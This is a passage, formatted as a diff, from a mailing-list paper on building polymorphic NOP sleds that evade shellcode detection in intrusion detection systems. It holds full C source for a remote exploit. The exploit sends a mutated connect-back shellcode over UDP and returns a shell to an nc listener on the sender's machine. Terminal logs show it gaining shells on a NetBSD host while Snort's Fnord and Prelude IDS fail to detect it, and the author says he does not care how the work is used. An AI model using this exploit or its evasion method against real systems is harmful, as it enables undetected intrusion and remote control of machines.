+to returning on a JMP argument has been greatly reduced, and may be further
+optimized by previous knowledge of the maximum "junk opcode" count on
+the IDS.
+
+There is still, however, one final step left - a polymorphic sled that
+works 100% of the time while still evading Serna's technique. The problem
+at hand is the extremely high likelihood that our exploit will fail if
+we land on a JMP argument. This can be solved by ensuring that all JMP
+arguments inserted into the payload are valid junk operators themselves.
+
+Originally a portion of our sled looked like this:
+
+<NOP><NOP><JMP><ARG><NOP><NOP>
+
+It is clear that we would encounter problems if <ARG> was hit directly.
+Consider the following:
+
+<NOP><NOP><JMP><JNOP><NOP><NOP>
+
+In this situation <JNOP> acts both as the argument to <JMP> and, if returned
+to directly, a <NOP>. The following is the final exploit in this paper.
+It contains a specialised array of opcodes suitable to act as a <JNOP>.
+This is needed to ensure that all of the JMP's go forward, which is done
+in order to avoid an endless loop (backward jumps are possible, but they
+are too sticky to implement here):
+
+/* START dragon_morphslide.c */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/select.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <time.h>
+#include "ADMmutapi.h"
+
+#define PAYLOAD_LENGTH  1024 + 8
+#define BASE_RET        0xbfbfd1f0
+
+char shellcode[] =
+ "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
+ "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
+ "\x61\xcd\x80\x31\xd2\x52\x52\xba"
+ "\x41\x41\x41\x41\x83\xf2\xff\x52"
+ "\x31\xd2\x66\x68\x8b\xa4\xb7\x02"
+ "\x66\x53\x89\xe1\xb2\x10\x52\x51"
+ "\x50\x52\x89\xc1\x31\xc0\xb0\x62"
+ "\xcd\x80\x89\xca\x31\xdb\x39\xc3"
+ "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
+ "\x31\xc0\x50\x52\x50\xb0\x5a\xcd"
+ "\x80\x31\xc0\x31\xdb\x43\x53\x52"
+ "\x50\xb0\x5a\xcd\x80\x31\xc0\x43"
+ "\x53\x52\x50\xb0\x5a\xcd\x80\x31"
+ "\xc0\x50\x68\x2f\x2f\x73\x68\x68"
+ "\x2f\x62\x69\x6e\x89\xe3\x50\x54"
+ "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
+ "\xb0\x01\xcd\x80";
+
+char jump_arg[] =
+ "\x50\x51\x52\x53\x54\x55\x56\x57"
+ "\x58\x59\x5a\x5b\x5d\x5e\x5f\x60"
+ "\x4d\x48\x47\x4f\x40\x41\x37\x3f"
+ "\x46\x4e\x27\x2f\x4a\x44\x42\x43"
+ "\x49\x4b\x45\x4c"
+
+ "\x04\x05\x06\x0c\x0d\x0e\x14\x15\x1c\x1d\x24\x25";
+
+void jump_slide(unsigned char *payload, int nop_size) {
+        int top, leap, noplen, x, y;
+        extern struct junks intel_njunk[];
+
+        top = nop_size - 3;
+        leap = 1;
+
+        srand(time(NULL));
+
+        for (x = 0; x < nop_size; x++) {
+                y= rand()%IA32_JUNKS;
+
+                if (!intel_njunk[y].noppad) {
+                        x--;
+                        continue;
+                }
+
+                *(payload+x) = *(intel_njunk[y].code);
+        }
+
+        srand(time(NULL)*getpid());
+        noplen = 0;
+
+        while (top > 0) {
+                noplen = rand()%20;
+                top -= noplen;
+
+                y = rand()%48;
+
+                if ((top + jump_arg[y]) < nop_size) {
+                        *(payload+top) = 0xeb;
+                        *(payload+top+1) = jump_arg[y];
+
+                        noplen = 0;
+                }
+                else {
+                        top += noplen;
+                        continue;
+                }
+        }
+}
+
+struct sockaddr_in get_localaddr(struct sockaddr_in saddr) {
+        int sockr, len, on = 1;
+        struct sockaddr_in dest;
+        struct sockaddr_in iface;
+
+        memset(&iface, 0, sizeof(iface));
+        memcpy(&dest, &saddr, sizeof(struct sockaddr_in));
+
+        dest.sin_port = htons(11111);
+
+        sockr = socket(AF_INET, SOCK_DGRAM, 0);
+
+        if (setsockopt(sockr, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on))
+                        == -1) {
+                printf("getsockopt error\n");
+                exit(1);
+        }
+
+        if (connect(sockr, (struct sockaddr *)&dest,
+                        sizeof(struct sockaddr_in)) == -1) {
+                printf("connect error\n");
+                exit(1);
+        }
+
+        len = sizeof(iface);
+
+        if (getsockname(sockr, (struct sockaddr *)&iface, &len) == -1)
+{
+                printf("getsockname error\n");
+                exit(1);
+        }
+
+        close(sockr);
+
+        return iface;
+}
+
+int main(int argc, char *argv[]) {
+        struct morphctl *mctlp;
+        struct morphctl mut;
+        int s, ret_adj, nops, x;
+        struct sockaddr_in saddr, caddr;
+        char payload[PAYLOAD_LENGTH+1];
+        long ret_addr;
+
+        if (argc < 2) {
+                printf( "./dragon_morphslide "
+                        "<target ip> [ret adjustment]\n");
+                exit(1);
+        }
+
+        if (strstr(argv[1], "255") != NULL) {
+                printf("invalid ip address\n");
+                exit(1);
+        }
+
+        if (argc > 2)
+                ret_adj = atoi(argv[2]);
+        else
+                ret_adj = 0;
+
+        mut.upper = mut.lower = 0;
+        mut.banned = NULL;
+        mctlp = &mut;
+        mut.arch = IA32_SLIDE;
+
+        saddr.sin_family = PF_INET;
+        saddr.sin_port = htons(1986);
+        inet_aton(argv[1], &saddr.sin_addr);
+
+        caddr = get_localaddr(saddr);
+
+        nops = 1024 - sizeof(shellcode);
+        memcpy(shellcode+24, &caddr.sin_addr, 4);
+
+        shellcode[24] ^= 255;
+        shellcode[25] ^= 255;
+        shellcode[26] ^= 255;
+        shellcode[27] ^= 255;
+
+        ret_addr = BASE_RET + ret_adj;
+
+        printf("using ret addr: %p\n", ret_addr);
+
+        memset(payload, 0x90, PAYLOAD_LENGTH);
+        memcpy(payload+nops, shellcode, sizeof(shellcode) - 1);
+
+        for (x = 0; x < (PAYLOAD_LENGTH-1024); x += 4)
+                *((long *) &payload[1024 + x]) = ret_addr;
+
+        payload[PAYLOAD_LENGTH] = '\0';
+
+        init_mutate(mctlp);
+        apply_key(payload, strlen(shellcode), nops-1, mctlp);
+        apply_engine(payload, strlen(shellcode), nops-1, mut);
+
+        for (x = 0; (unsigned char) payload[x] == 0x90; x++);
+
+        jump_slide(payload, x-1);
+
+        if ((s = socket(PF_INET, SOCK_DGRAM, 0)) == -1) {
+                perror("socket");
+                exit(1);
+        }
+
+        if (sendto(s, payload, PAYLOAD_LENGTH, 0, (struct sockaddr *)
+
+                        &saddr, sizeof(saddr)) == -1) {
+                perror("sendto");
+                close(s);
+                exit(1);
+        }
+
+        close(s);
+}
+/* END dragon_morphsled.c */
+
+- --------
+satyr$ gcc -o dragon_morphsled dragon_morphsled.c ADMmuteng.o
+satyr$ ./dragon_morphsled 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+halo# ./nidsfindshellcode -d bce0
+nidsfindshellcode 0.2 by Ferm�n J. Serna <fjserna@...ec.com>
+Next Generation Security Technologies
+http://www.ngsec.com
+
+- --------
+
+So our final exploit was successful and we remain undetected. We have
+created a polymorphic payload that will run successfully 100% of the
+time while remaining hidden from the NIDSfindshellcode tool and the detection
+technique it uses. All that is left is the need to consider what steps
+an IDS researcher may take to counteract the evasion techniques presented
+above.
+
+- ------------------------------------
+- ---- Future ------------------------
+
+Let us consider the final evasion technique displayed in dragon_morphsled.
+At first glance there is only one element that is stopping Serna's method
+from working, that being the introduction of a jump operation. If we
+were to treat the jump opcode used (0xeb) as a junk nop then the sled
+would be detected as normal.
+
+There are two counter arguments to this. Firstly, adding the jump opcode
+to the list of junk nops would indeed detect dragon_morphsled, but dragon_nopjump
+would remain undetected, provided the jump calls were numerous enough
+and that their argument was not in the list of valid nops. This does
+of course introduce the possibility for first-time failure of the exploit,
+ but depending on the circumstance this would not be a significant downfall.
+
+The second argument lies in the fact that the jumps could be replaced
+by any number of 2 or even 3 byte operations, provided that the operation
+has no effect or that the effect is reversable by another suitable operation
+somewhere in the sled. Some might claim that this is no better, that
+these new operations could be added to the list of junk opcodes. The
+problem with doing this lies in the sheer number of possible operations
+suitable for the technique. Simply put, to add all of these to the list
+of junk opcodes would cause an unacceptable level of false positives.
+
+- ------------------------------------
+- ---- Thoughts ----------------------
+
+Being of an entirely detached and unsympathetic nature I did not release
+this paper for any one particular purpose. What I mean in saying this
+is that I was not in the least interested in how the aforementioned techniques
+would affect security. For good or bad, whatever they might be, it doesn't
+really matter. What is important, at least to me, is the continual flow
+of ideas. As I see it, releasing this paper is an investment in future
+ideas from which I myself (and perhaps others in the world) may benefit.
+
+- ------------------------------------
+- ---- Appendix ----------------------
+
+In March 2002, Dragos Ruiu released the Snort preprocessor "Fnord" designed
+to add polymorphic shellcode detection to the Snort IDS. The following
+is a short test of Fnord's capabilities against the techniques described
+above.
+
+- --------
+halo# ./snort -V
+- -*> Snort! <*-
+Version 2.2.0 (Build 30)
+By Martin Roesch (roesch@...rcefire.com, www.snort.org)
+halo# cat /usr/pkg/etc/snort/snort.conf | grep fnord
+preprocessor fnord
+halo# snort -A console -c /usr/pkg/etc/snort/snort.conf 2> /dev/null
+
+satyr$ ./dragon_polymorph 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+halo# snort -A console -c /usr/pkg/etc/snort/snort.conf 2> /dev/null
+09/30-10:37:13.958554  [**] [114:1:1] spp_fnord: Possible Mutated IA32
+NOP
+sled detected. [**] {UDP} 192.168.0.2:2061 -> 192.168.0.5:1986
+- --------
+
+We can see from this that Fnord successfully detected a traditional polymorphic
+attack. Lets now try the techniques developed in this paper.
+
+- --------
+satyr$ ./dragon_jumpslide 192.168.0.5 1 2> /dev/null
+using ret addr: 0xbfbfd1f1
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+satyr$ ./dragon_nopjump 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satry$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+satyr$ ./dragon_morphsled 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+halo# snort -A console -c /usr/pkg/etc/snort/snort.conf 2> /dev/null
+
+- --------
+
+All three exploits were successful in evading Snort's Fnord polymorphic
+detecton capabilities.
+
+The Prelude Hybrid IDS contains a plugin for the detection of polymorphic
+shellcode. The following is a short test of Prelude Hybrid's capabilities
+against the techniques described above.
+
+- --------
+halo# prelude-manager --version | grep manager
+prelude-manager 0.8.10
+halo# grep Shellcode /usr/local/etc/prelude-nids/prelude-nids.conf
+[Shellcode]
+halo# prelude-nids -i bce0 -d
+- - Initialized 3 protocols plugins.
+- - Initialized 5 detections plugins.
+
+Daemon started, PID is 14885
+halo#
+
+satyr$ ./dragon_polymorph 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+halo# grep IA32 /var/log/prelude.log
+* Classification: IA32 shellcode found
+halo#
+
+- --------
+
+Prelude Hybrid IDS successfully identified the traditonal polymorphic
+attack payload. Lets now try the techniques developed in this paper.
+
+- --------
+satyr$ ./dragon_jumpslide 192.168.0.5 1 2> /dev/null
+using ret addr: 0xbfbfd1f1
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+satyr$ ./dragon_nopjump 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satry$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+satyr$ ./dragon_morphsled 192.168.0.5 2> /dev/null
+using ret addr: 0xbfbfd1f0
+satyr$
+
+satyr$ nc -l -p 35748
+uname -msr
+NetBSD 1.6.2_STABLE i386
+exit
+satyr$
+
+halo# grep IA32 /var/log/prelude.log
+halo#
+- --------
+
+All three exploits were successful in evading Prelude Hybrid's polymorphic
+detecton capabilities.
+
+- ------------------------------------
+- ---- Reference ---------------------
+
+[1] "Polymorphic Shellcode Engine"
+        http://www.phrack.org/show.php?p=61&a=9
+[2] "Polymorphic Shellcodes vs. Application IDSs"
+        http://www.ngsec.com/ngresearch/ngwhitepapers/
+[3] "Fnord Snort Preprocessor"
+        http://www.cansecwest.com/spp_fnord.c
+[4] "Prelude Hybrid IDS"
+        http://www.prelude-ids.org
+[5] "ADMmutate Engine"
+        http://www.ktwo.ca/ADMmutate-0.8.4.tar.gz
+
+- ------------------------------------
+
+-----BEGIN PGP SIGNATURE-----
+Note: This signature can be verified at https://www.hushtools.com/verify
+Version: Hush 2.4
+
+wkYEARECAAYFAkFd9fgACgkQImcz/hfgxg14ngCfTrgqCG0dDwCmGRwc7hBSzIfdTyAA
+n2cqIBgjoLDtUxo2PaGQcN51NybB
+=ZvVF
+-----END PGP SIGNATURE-----
+
+
+
+
+Concerned about your privacy? Follow this link to get
+secure FREE email: http://www.hushmail.com/?l=2
+
+Free, ultra-private instant messaging with Hush Messenger
+http://www.hushmail.com/services-messenger?l=434
+
+Promote security and make money with the Hushmail Affiliate Program: 
+http://www.hushmail.com/about-affiliate?l=427
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.netsys.com/full-disclosure-charter.html
+
+
